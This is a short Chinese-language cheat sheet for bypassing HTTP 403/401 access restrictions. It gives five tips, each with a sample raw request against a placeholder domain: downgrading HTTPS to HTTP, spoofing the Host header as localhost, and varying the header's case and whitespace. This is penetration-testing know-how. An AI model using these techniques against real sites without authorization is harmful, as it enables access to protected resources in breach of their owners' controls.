## 403绕过总结

```shell
HTTP/1.1 403 Forbidden OR 401 Unauthorized
  Content-Length: Number
  Content-Type: text/html; charset=UTF-8
 <h1> You Don’t Have Permission To Access </h1> 
 
```

## tip-01

403
```shell
https://www.company.com/authorization-response

```

https变为http

```shell
http://www.company.com/authorization-response
```

## tip-02

Host用 localhost

```shell
GET /authorization-response HTTP/1.1 
Host: www.company.com
#重点
Host: localhost
User-Agent: Mozilla/5.0
Referer: https://previous.com/path 
Origin: https://www.company.com
```


## tip-03

Host ---> host

```shell
GET /authorization-response HTTP/1.1 
host: www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path 
Origin: https://www.company.com
```

## tip-04
去除空格键

```shell
GET /authorization-response HTTP/1.1
#一般Host后面是有一个空格的，这里没有
Host:www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path 
Origin: https://www.company.com
```

## tip-05

增加Tab键替换原有的空格键:

```shell
GET /authorization-response HTTP/1.1
#
Host:  www.company.com
User-Agent: Mozilla/5.0
Referer: https://previous.com/path 
Origin: https://www.company.com
```

